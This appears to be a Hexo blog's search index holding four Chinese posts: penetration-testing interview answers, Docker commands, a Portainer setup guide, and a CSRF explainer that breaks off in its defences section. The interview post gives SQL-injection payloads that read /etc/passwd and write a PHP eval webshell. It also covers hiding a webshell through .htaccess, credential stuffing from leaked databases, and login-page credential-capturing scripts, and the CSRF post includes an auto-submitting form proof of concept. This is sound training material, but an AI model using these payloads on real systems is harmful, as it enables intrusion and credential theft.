<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>渗透测试面试总结(一)</title>
    <url>/2019/12/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E8%AF%95%E9%A2%98/</url>
    <content><![CDATA[<p>关于面试的一些总结。</p>
<a id="more"></a>

<p><strong>1.mysql的网站注入，5.0以上和5.0一下有什么区别</strong></p>
<p>5.0一下没有information_shema这个系统表，无法列表名等，只能暴力跑表名 5.0一下多是但用户单操作等，5.0以上是多用户多操作。</p>
<p><strong>2.在渗透测试过程中，手机目标站注册人邮箱对我们有什么价值。</strong></p>
<p>1.社工库看看有什么线索，尝试撞库 2.邮箱丢到搜索引擎里看看 3.用搜索到的关联信息找到社交账号 4.再次使用社工库看看密码的使用习惯 5.生成密码字典爆破 6.观察浏览那些非大众的网站</p>
<p><strong>3.判断出CMS对渗透有什么意义</strong></p>
<p>查找网上已曝光的关于cms的漏洞 或者github上查看是否开源了源码白盒审计源码。</p>
<p><strong>4.一个成熟并且相对安全的CMS，渗透是扫目录的意义。</strong></p>
<p>1.扫描敏感文件，二级目录扫描。 2.站长的误操作：网站备份文件压缩，说明txt文件，二级目录可能存放其他的站点。</p>
<p><strong>5.常见的网站服务器容器</strong></p>
<p>IIS Apache Nginx Tomcat Weblogic Jboss</p>
<p><strong>6.mysql注入点，怎么样写入一句话，需要哪些条件。</strong></p>
<p>root 权限以及网站的绝对路径</p>
<p>load_file()读取文件操作：</p>
<p>知道文件的绝对路径 能够使用 union 查询 对web目录有写的权限</p>
<p>union select 1,load_file(‘/etc/passwd’),3,4,5#</p>
<p>select 1,load_file(0x2f6574632f706173737764),3,4,5#</p>
<p>路径没有加单引号的话必须转换十六进制 要是想省略单引号的话必须转换十六进制</p>
<p>into outfile 写入文件操作：</p>
<p>文件名必须是全路径(绝对路径) 用户必须有写文件的权限 没有对单引号’过滤</p>
<p><code>select &#39;&lt;?php phpinfo(); ?&gt;&#39; into outfile &#39;C:/Windows/tmp/cmd.php&#39;</code></p>
<p><code>select &#39;&lt;?php @eval($_POST[&quot;admin&quot;]); ?&gt;&#39; into outfile &#39;C:/Windows/tmp/eval.php&#39;</code></p>
<p>路径里面两个反斜杠\可以换成一个正斜杠/</p>
<p>PHP语句没有单引号的话，必须转换成十六进制 要是想省略单引号’的话,必须转换成十六进制</p>
<p><strong>7.拿到一个待检测的站，你觉得应该先做什么？</strong></p>
<p>收集信息：whois、网站源 IP、旁站、C 段网站、服务器系统版本、容器版本、</p>
<p>程序版本、数据库类型、二级域名、防火墙、维护者信息另说…</p>
<p>8.<strong>目前已知哪些版本的容器有解析漏洞，具体举例?</strong></p>
<p>(1) IIS 6.0</p>
<p>/xx.asp/xx.jpg “xx.asp”是文件夹名</p>
<p>(2) IIS 7.0/7.5</p>
<p>默认 Fast-CGI 开启，直接在 url 中图片地址后面输入/1.php，会把正常图片</p>
<p>当成 php 解析</p>
<p>(3) Nginx</p>
<p>版本小于等于 0.8.37，利用方法和 IIS 7.0/7.5 一样，Fast-CGI 关闭情况下也</p>
<p>可利用。</p>
<p>空字节代码 xxx.jpg.php</p>
<p>(4)Apache</p>
<p>上传的文件命名为：test.php.x1.x2.x3，Apache 是从右往左判断后缀</p>
<p>(6)lighttpd</p>
<p>xx.jpg/xx.php</p>
<p><strong>9.如何手工快速判断目标站是 windows 还是 linux 服务器？</strong></p>
<p>linux 大小写敏感,windows 大小写不敏感</p>
<p><strong>10.为何一个 mysql 数据库的站，只有一个 80 端口开放？</strong></p>
<p>(1)更改了端口，没有扫描出来</p>
<p>(2) 站库分离(3) 3306 端口不对外开放</p>
<p><strong>11.3389 无法连接的几种情况?</strong></p>
<p>(1)没开放 3389 端口</p>
<p>(2)端口被修改</p>
<p>(3) 防护拦截</p>
<p>(4)处于内网(需进行端口转发)</p>
<p><strong>12.如何突破注入时字符被转义？</strong></p>
<p>宽字符注入;hex 编码绕过</p>
<p><strong>13.在某后台新闻编辑界面看到编辑器，应该先做什么？</strong></p>
<p>查看编辑器的名称版本,然后搜索公开的漏洞</p>
<p><strong>14.拿到一个 webshell 发现网站根目录下有.htaccess 文件，我们能做什么？</strong></p>
<p>能做的事情很多，用隐藏网马来举例子：</p>
<p>插入&lt;FilesMatch “xxx.jpg”&gt; SetHandler application/x-httpd-php </p>
</FilesMatch>

<p>.jpg 文件会被解析成.php 文件</p>
<p><strong>15.注入漏洞只能查账号密码？</strong>可脱裤，可上传 webshell,可执行命令</p>
<p><strong>16.安全狗会追踪变量，从而发现出是一句话木马吗？</strong></p>
<p>是根据特征码，所以很好绕过</p>
<p><strong>17.access 扫出后缀为 asp 的数据库文件，访问乱码。如何实现到本地利用?</strong></p>
<p>迅雷下载，直接改后缀为.mdb</p>
<p><strong>18.提权时选择可读写目录，为何尽量不用带空格的目录？</strong></p>
<p>因为 exp 执行多半需要空格界定参数</p>
<p><strong>19.某服务器有站点 A,B 为何在 A 的后台添加 test 用户，访问 B 的后台。发现</strong></p>
<p><strong>也添加上了 test 用户？</strong></p>
<p>同数据库</p>
<p><strong>20.注入时可以不使用 and 或 or 或 xor，直接 order by 开始注入吗？</strong></p>
<p>and/or/xor，前面的 1=1、1=2 步骤只是为了判断是否为注入点，如果已经</p>
<p>确定是注入点那就可以省那步骤去</p>
<p><strong>21:某个防注入系统，在注入时会提示：统检测到你有非法注入的行为。已记录</strong></p>
<p><strong>您的 ip xx.xx.xx.xx 时间:2016:01-23 提交页面:test.asp?id=15 提交内</strong></p>
<p><strong>容:and 1=1 如何利用这个防注入系统拿 shell？</strong> </p>
<p>在 URL 里面直接提交一句话，这样网站就把你的一句话也记录进数据库文件</p>
<p>了 这个时候可以尝试寻找网站的配置文件 直接上菜刀链接。具体文章参见：<a href="http://ytxiao.lofter.com/post/40583a_ab36540" target="_blank" rel="noopener">http://ytxiao.lofter.com/post/40583a_ab36540</a></p>
<p><strong>22.上传大马后访问乱码时，有哪些解决办法？</strong></p>
<p>浏览器中改编码</p>
<p><strong>23.审查上传点的元素有什么意义？</strong></p>
<p>有些站点的上传文件类型的限制是在前端实现的，这时只要增加上传类型就</p>
<p>能突破限制了</p>
<p><strong>24.目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，</strong></p>
<p><strong>你觉得这里怎样利用？</strong></p>
<p>先爆破用户名，再利用被爆破出来的用户名爆破密码。</p>
<p><strong>25.目标站发现某 txt 的下载地址为</strong></p>
<p><strong><a href="http://www.test.com/down/down.php?file=/upwdown/1.txt，你有什" target="_blank" rel="noopener">http://www.test.com/down/down.php?file=/upwdown/1.txt，你有什</a></strong></p>
<p><strong>么思路？</strong></p>
<p>这就任意文件下载漏洞，在 file=后面尝试输入 index.php 下载他的首页文件，</p>
<p>然后在首页文件里继续查找其他网站的配置文件，可以找出网站的数据库密码和</p>
<p>数据库的地址。</p>
<p><strong>26.甲给你一个目标站，并且告诉你根目录下存在/abc/目录，并且此目录下存</strong></p>
<p><strong>在编辑器和 admin 目录。请问你的想法是？</strong>直接在网站二级目录/abc/下扫描敏感文件及目录</p>
<p><strong>27.在有 shell 的情况下，如何使用 xss 实现对目标站的长久控制？</strong></p>
<p>（1)后台登录处加一段记录登录账号密码的 js，并且判断是否登录成功，如</p>
<p>果登录成功，就把账号密码记录到一个生僻的路径的文件中或者直接发到自己的</p>
<p>网站文件中。(此方法适合有价值并且需要深入控制权限的网络)</p>
<p>(2)在登录后才可以访问的文件中插入 XSS 脚本</p>
<p><strong>28.后台修改管理员密码处，原密码显示为*。你觉得该怎样实现读出这个用户的</strong></p>
<p><strong>密码？</strong></p>
<p>审查元素 把密码处的 password 属性改成 text 就明文显示了</p>
<p><strong>29.目标站无防护，上传图片可以正常访问，上传脚本格式访问则 403.什么原</strong></p>
<p><strong>因？</strong></p>
<p>原因很多，有可能 web 服务器配置把上传目录写死了不执行相应脚本，尝试</p>
<p>改后缀名绕过</p>
<p><strong>30.审查元素得知网站所使用的防护软件，你觉得怎样做到的？</strong></p>
<p>在敏感操作被拦截，通过界面信息无法具体判断是什么防护的时候，F12 看</p>
<p>HTML 体部 比如护卫神就可以在名称那看到<hws>内容<hws></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker的一些使用</title>
    <url>/2019/12/20/Docker%E7%9A%84%E4%B8%80%E4%BA%9B%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>Docker 是一个开源的应用容器引擎，基于 <a href="https://www.runoob.com/go/go-tutorial.html" target="_blank" rel="noopener">Go 语言</a> 并遵从 Apache2.0 协议开源。</p>
<p>Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。</p>
<p>容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。</p>
<a id="more"></a>

<h3 id="run-创建一个新的容器并运行一个命令"><a href="#run-创建一个新的容器并运行一个命令" class="headerlink" title="run 创建一个新的容器并运行一个命令"></a>run 创建一个新的容器并运行一个命令</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法</span><br><span class="line">docker run [OPTIONS] IMAGE [COMMAND] [ARG...]</span><br><span class="line">OPTIONS说明：</span><br><span class="line">-a stdin: 指定标准输入输出内容类型，可选 STDIN/STDOUT/STDERR 三项；</span><br><span class="line">-d: 后台运行容器，并返回容器ID；</span><br><span class="line">-i: 以交互模式运行容器，通常与 -t 同时使用；</span><br><span class="line">-p: 端口映射，格式为：主机(宿主)端口:容器端口 </span><br><span class="line">-t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用；</span><br><span class="line">--name=&quot;nginx-lb&quot;: 为容器指定一个名称；</span><br><span class="line">--dns 8.8.8.8: 指定容器使用的DNS服务器，默认和宿主一致；</span><br><span class="line">--dns-search example.com: 指定容器DNS搜索域名，默认和宿主一致；</span><br><span class="line">-h &quot;mars&quot;: 指定容器的hostname；</span><br><span class="line">-e username=&quot;ritchie&quot;: 设置环境变量；</span><br><span class="line">--env-file=[]: 从指定文件读入环境变量；</span><br><span class="line">--cpuset=&quot;0-2&quot; or --cpuset=&quot;0,1,2&quot;: 绑定容器到指定CPU运行；</span><br><span class="line">-m :设置容器使用内存最大值；</span><br><span class="line">--net=&quot;bridge&quot;: 指定容器的网络连接类型，支持 bridge/host/none/container: 四种类型；</span><br><span class="line">--link=[]: 添加链接到另一个容器；</span><br><span class="line">--expose=[]: 开放一个端口或一组端口</span><br></pre></td></tr></table></figure>

<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>使用docker镜像nginx:latest以后台模式启动一个容器,并将容器命名为mynginx。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run --name mynginx -d nginx:latest</span><br></pre></td></tr></table></figure>

<p>使用镜像nginx:latest以后台模式启动一个容器,并将容器的80端口映射到主机随机端口。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -P -d nginx:latest</span><br></pre></td></tr></table></figure>

<p>使用镜像 nginx:latest，以后台模式启动一个容器,将容器的 80 端口映射到主机的 80 端口,主机的目录 /data 映射到容器的 /data。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -p 80:80 -v /data:/data -d nginx:latest</span><br></pre></td></tr></table></figure>

<p>绑定容器的 8080 端口，并将其映射到本地主机 127.0.0.1 的 80 端口上。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker run -p 127.0.0.1:80:8080/tcp ubuntu bash</span><br></pre></td></tr></table></figure>

<p>使用镜像nginx:latest以交互模式启动一个容器,在容器内执行/bin/bash命令。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">runoob@melon:~$ docker run -it nginx:latest /bin/bash</span><br><span class="line">root@a25352c562:/#</span><br></pre></td></tr></table></figure>

<h3 id="start-stop-restart"><a href="#start-stop-restart" class="headerlink" title="start/stop/restart"></a>start/stop/restart</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker start :启动一个或多少已经被停止的容器</span><br><span class="line">docker stop :停止一个运行中的容器</span><br><span class="line">docker restart :重启容器</span><br><span class="line">语法</span><br><span class="line">docker start [OPTIONS] CONTAINER [CONTAINER...]</span><br><span class="line">docker stop [OPTIONS] CONTAINER [CONTAINER...]</span><br><span class="line">docker restart [OPTIONS] CONTAINER [CONTAINER...]</span><br><span class="line">实例</span><br><span class="line">启动已被停止的容器myrunoob</span><br><span class="line">docker start myrunoob</span><br><span class="line">停止运行中的容器myrunoob</span><br><span class="line">docker stop myrunoob</span><br><span class="line">重启容器myrunoob</span><br><span class="line">docker restart myrunoob</span><br></pre></td></tr></table></figure>

<h3 id="rm-删除一个或多少容器"><a href="#rm-删除一个或多少容器" class="headerlink" title="rm 删除一个或多少容器"></a>rm 删除一个或多少容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法</span><br><span class="line">docker rm [OPTIONS] CONTAINER [CONTAINER...]</span><br><span class="line">OPTIONS说明：</span><br><span class="line">-f :通过SIGKILL信号强制删除一个运行中的容器</span><br><span class="line">-l :移除容器间的网络连接，而非容器本身</span><br><span class="line">-v :-v 删除与容器关联的卷</span><br><span class="line">实例</span><br><span class="line">强制删除容器db01、db02</span><br><span class="line">docker rm -f db01 db02</span><br><span class="line">移除容器nginx01对容器db01的连接，连接名db</span><br><span class="line">docker rm -l db </span><br><span class="line">删除容器nginx01,并删除容器挂载的数据卷</span><br><span class="line">docker rm -v nginx01</span><br></pre></td></tr></table></figure>

<h3 id="exec-在运行的容器中执行命令"><a href="#exec-在运行的容器中执行命令" class="headerlink" title="exec 在运行的容器中执行命令"></a>exec 在运行的容器中执行命令</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法</span><br><span class="line">docker exec [OPTIONS] CONTAINER COMMAND [ARG...]</span><br><span class="line">OPTIONS说明：</span><br><span class="line">-d :分离模式: 在后台运行</span><br><span class="line">-i :即使没有附加也保持STDIN 打开</span><br><span class="line">-t :分配一个伪终端</span><br><span class="line">实例</span><br><span class="line">在容器mynginx中以交互模式执行容器内/root/runoob.sh脚本</span><br><span class="line"></span><br><span class="line">runoob@runoob:~$ docker exec -it mynginx /bin/sh /root/runoob.sh</span><br><span class="line">http://www.runoob.com/</span><br><span class="line">在容器mynginx中开启一个交互模式的终端</span><br><span class="line">runoob@runoob:~$ docker exec -i -t  mynginx /bin/bash</span><br><span class="line">root@b1a0703e41e7:/#</span><br></pre></td></tr></table></figure>

<h3 id="ps-列出容器"><a href="#ps-列出容器" class="headerlink" title="ps  列出容器"></a>ps  列出容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法</span><br><span class="line">docker ps [OPTIONS]</span><br><span class="line">OPTIONS说明：</span><br><span class="line">-a :显示所有的容器，包括未运行的。</span><br><span class="line">-f :根据条件过滤显示的内容。</span><br><span class="line"></span><br><span class="line">--format :指定返回值的模板文件。</span><br><span class="line">-l :显示最近创建的容器。</span><br><span class="line">-n :列出最近创建的n个容器。</span><br><span class="line">--no-trunc :不截断输出。</span><br><span class="line">-q :静默模式，只显示容器编号。</span><br><span class="line">-s :显示总的文件大小。</span><br><span class="line">实例</span><br><span class="line">列出所有在运行的容器信息。</span><br><span class="line">runoob@runoob:~$ docker ps</span><br><span class="line">CONTAINER ID   IMAGE          COMMAND                ...  PORTS                    NAMES</span><br><span class="line">09b93464c2f7   nginx:latest   &quot;nginx -g &apos;daemon off&quot; ...  80/tcp, 443/tcp          myrunoob</span><br><span class="line">列出最近创建的5个容器信息。</span><br><span class="line">runoob@runoob:~$ docker ps -n 5</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                   CREATED           </span><br><span class="line">09b93464c2f7        nginx:latest        &quot;nginx -g &apos;daemon off&quot;    2 days ago   ...   </span><br><span class="line">列出所有创建的容器ID。</span><br><span class="line">runoob@melon:~$ docker ps -a -q</span><br><span class="line">a135ad1da351</span><br><span class="line">a1da31d5aw1d</span><br><span class="line">a31da15344ad</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>关于Docker的可视化</title>
    <url>/2019/12/18/%E5%85%B3%E4%BA%8EDocker%E5%8F%AF%E8%A7%86%E5%8C%96/</url>
    <content><![CDATA[<p>Docker 是一个<a href="https://baike.baidu.com/item/开源/246339" target="_blank" rel="noopener">开源</a>的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任何流行的 <a href="https://baike.baidu.com/item/Linux" target="_blank" rel="noopener">Linux</a>或Windows 机器上，也可以实现<a href="https://baike.baidu.com/item/虚拟化/547949" target="_blank" rel="noopener">虚拟化</a>。容器是完全使用<a href="https://baike.baidu.com/item/沙箱/393318" target="_blank" rel="noopener">沙箱</a>机制，相互之间不会有任何接口。</p>
<a id="more"></a>

<h1 id="Docker可视化管理工具"><a href="#Docker可视化管理工具" class="headerlink" title="Docker可视化管理工具"></a>Docker可视化管理工具</h1><p>Docker常见的几款web工具：</p>
<ul>
<li>docker UI</li>
<li>shipyard</li>
<li>portainer</li>
</ul>
<p><strong>本次是在Centos7上安装portainer</strong><br>首先搜索一下Docker Hub上的portainer镜像</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker search portainer</span><br></pre></td></tr></table></figure>

<p><a href="https://tva2.sinaimg.cn/large/007DFXDhgy1g5apaa4odfj317s0i3mz3.jpg" target="_blank" rel="noopener"><img src="https://tva2.sinaimg.cn/large/007DFXDhgy1g5apaa4odfj317s0i3mz3.jpg" alt="img"></a><br>然后下载官方portainer镜像</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker pull portainer/portainer</span><br></pre></td></tr></table></figure>

<p><a href="https://tva1.sinaimg.cn/large/007DFXDhgy1g5apbdqnw2j30ue04qq36.jpg" target="_blank" rel="noopener"><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g5apbdqnw2j30ue04qq36.jpg" alt="img"></a><br>在后台运行portainer容器，端口映射成9000，–restart=always表示开机自启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 9000:9000 --restart=always --name portainer -v /var/run/docker.sock:/var/run/docker.sock -v /Users/lee/dev/docker_file/portainer/data:/data docker.io/portainer/portainer</span><br></pre></td></tr></table></figure>

<p><a href="https://tva1.sinaimg.cn/large/007DFXDhgy1g5apbwfaknj317z02qdfy.jpg" target="_blank" rel="noopener"><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g5apbwfaknj317z02qdfy.jpg" alt="img"></a><br><a href="https://tva3.sinaimg.cn/large/007DFXDhgy1g5apeg4xyxj317t03ft8r.jpg" target="_blank" rel="noopener"><img src="https://tva3.sinaimg.cn/large/007DFXDhgy1g5apeg4xyxj317t03ft8r.jpg" alt="img"></a><br>启动成功，浏览器访问ip:9000，初次访问需要设置密码，8位以上<br><a href="https://tva4.sinaimg.cn/large/007DFXDhgy1g5apeqzav0j31hc0scgnh.jpg" target="_blank" rel="noopener"><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g5apeqzav0j31hc0scgnh.jpg" alt="img"></a><br>然后选择Local(本地模式)<br><a href="https://tva2.sinaimg.cn/large/007DFXDhgy1g5apjkuqpzj31hc0scn0g.jpg" target="_blank" rel="noopener"><img src="https://tva2.sinaimg.cn/large/007DFXDhgy1g5apjkuqpzj31hc0scn0g.jpg" alt="img"></a><br><a href="https://tva1.sinaimg.cn/large/007DFXDhgy1g5apkghmtbj31hc0scgog.jpg" target="_blank" rel="noopener"><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g5apkghmtbj31hc0scgog.jpg" alt="img"></a><br><a href="https://tva4.sinaimg.cn/large/007DFXDhgy1g5apl30k8uj31hc0sc0vv.jpg" target="_blank" rel="noopener"><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g5apl30k8uj31hc0sc0vv.jpg" alt="img"></a><br>功能区<br><a href="https://tva1.sinaimg.cn/large/007DFXDhgy1g5appmkxx0j31hc0scdjr.jpg" target="_blank" rel="noopener"><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g5appmkxx0j31hc0scdjr.jpg" alt="img"></a><br>我们可以在images功能处直接pull一个新镜像(必须是Docker Hub上有的)<br><a href="https://tva2.sinaimg.cn/large/007DFXDhgy1g5apst92gcj31hc0sctd4.jpg" target="_blank" rel="noopener"><img src="https://tva2.sinaimg.cn/large/007DFXDhgy1g5apst92gcj31hc0sctd4.jpg" alt="img"></a><br><a href="https://tva2.sinaimg.cn/large/007DFXDhgy1g5apt4r0qqj31hc0sc79j.jpg" target="_blank" rel="noopener"><img src="https://tva2.sinaimg.cn/large/007DFXDhgy1g5apt4r0qqj31hc0sc79j.jpg" alt="img"></a><br>添加容器<br><a href="https://tva4.sinaimg.cn/large/007DFXDhgy1g5aptws77mj31hc0scadi.jpg" target="_blank" rel="noopener"><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g5aptws77mj31hc0scadi.jpg" alt="img"></a><br><a href="https://tva1.sinaimg.cn/large/007DFXDhgy1g5apud185pj31hc0sc442.jpg" target="_blank" rel="noopener"><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g5apud185pj31hc0sc442.jpg" alt="img"></a><br>可以将容器内的端口全部随机映射到本机，也可以手动添加需要映射的端口，本次是将容器的80端口映射到本机的8080端口<br><a href="https://tva2.sinaimg.cn/large/007DFXDhgy1g5apwr4faxj313x0aegmo.jpg" target="_blank" rel="noopener"><img src="https://tva2.sinaimg.cn/large/007DFXDhgy1g5apwr4faxj313x0aegmo.jpg" alt="img"></a><br>启动成功<br><a href="https://tva1.sinaimg.cn/large/007DFXDhgy1g5apxivmzgj31hc0scwj8.jpg" target="_blank" rel="noopener"><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g5apxivmzgj31hc0scwj8.jpg" alt="img"></a><br><a href="https://tva3.sinaimg.cn/large/007DFXDhgy1g5apzvg8pdj31hc0sc7bj.jpg" target="_blank" rel="noopener"><img src="https://tva3.sinaimg.cn/large/007DFXDhgy1g5apzvg8pdj31hc0sc7bj.jpg" alt="img"></a><br><a href="https://linuz.me/2019/07/24/Docker-portainer/" target="_blank" rel="noopener">文章转自</a></p>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>可视化</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF总结</title>
    <url>/2019/12/17/CSRF/</url>
    <content><![CDATA[<p>CSRF跨站点请求伪造(Cross—Site Request Forgery)，跟XSS攻击一样，存在巨大的危害性，你可以这样来理解：<br>攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。 如下：其中Web A为存在CSRF漏洞的网站，Web B为攻击者构建的恶意网站，User C为Web A网站的合法用户。</p>
<a id="more"></a>

<h2 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h2><p>CSRF跨站点请求伪造(Cross—Site Request Forgery)，跟XSS攻击一样，存在巨大的危害性，你可以这样来理解：<br>攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。 如下：其中Web A为存在CSRF漏洞的网站，Web B为攻击者构建的恶意网站，User C为Web A网站的合法用户。</p>
<h2 id="0x01-攻击原理"><a href="#0x01-攻击原理" class="headerlink" title="0x01 攻击原理"></a>0x01 攻击原理</h2><p>1.用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A。<br>2.在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A。<br>3.用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B。<br>4.网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A。<br>5.浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。 </p>
<h2 id="0x02攻击举例"><a href="#0x02攻击举例" class="headerlink" title="0x02攻击举例"></a>0x02攻击举例</h2><p>受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求 <code>http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=BOB</code> 可以使 Bob 把 1000000 的存款转到 bob 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该 session 的用户 Bob 已经成功登陆。</p>
<p>​    黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。Mallory 可以自己发送一个请求给银行：<code>http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</code>。但是这个请求来自 Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。</p>
<p>​    这时，Mallory 想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入如下代码： <code>src=&quot;http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory&quot;</code>，并且通过广告等诱使 Bob 来访问他的网站。当 Bob 访问该网站时，上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器。大多数情况下，该请求会失败，因为他要求 Bob 的认证信息。但是，如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 Bob 的认证信息。这时，悲剧发生了，这个 url 请求就会得到响应，钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。 </p>
<p>攻击代码举例：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;form id=<span class="string">"ak"</span> action=<span class="string">"http://www.xxx.com/transfer.do"</span> method=<span class="string">"POST"</span> display=<span class="string">"none"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"accountNum"</span> value=<span class="string">"10001"</span>/&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"money"</span> value=<span class="string">"10000"</span>/&gt;</span><br><span class="line">&lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">    var form = document.getElementById('ak'); /</span><span class="regexp">/获取ID对应的对象 document.forms.ak.submit() (这样也可以提交 自动跳转多种多样这里不再一一举例)</span></span><br><span class="line"><span class="regexp">    form.submit(); /</span><span class="regexp">/执行提交表单</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/CSRF.png" alt="html">    </p>
<p><a href="https://www.4hou.com/web/10234.html" target="_blank" rel="noopener">在JSON端点上利用CSRF漏洞的实践教程</a></p>
<p>网上也会有大量的例子这里大家搜索一下或者在DVWA上做实验即可。</p>
<h2 id="0x03CSRF一些防御手法"><a href="#0x03CSRF一些防御手法" class="headerlink" title="0x03CSRF一些防御手法"></a>0x03CSRF一些防御手法</h2><p><strong>防御CSRF攻击：</strong></p>
<p>​    目前防御 CSRF 攻击主要有三种策略：验证 HTTP Referer 字段；在请求地址中添加 token 并验证；在 HTTP 头中自定义属性并验证。</p>
<p><a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet" target="_blank" rel="noopener">OWASP的网站有一些很好的文档来防止你的网站上出现CSRF漏洞</a></p>
<p>   <strong>验证 HTTP Referer 字段</strong></p>
<p>​    根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问 <code>http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</code>，用户必须先登陆 bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。</p>
<p>​    这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。</p>
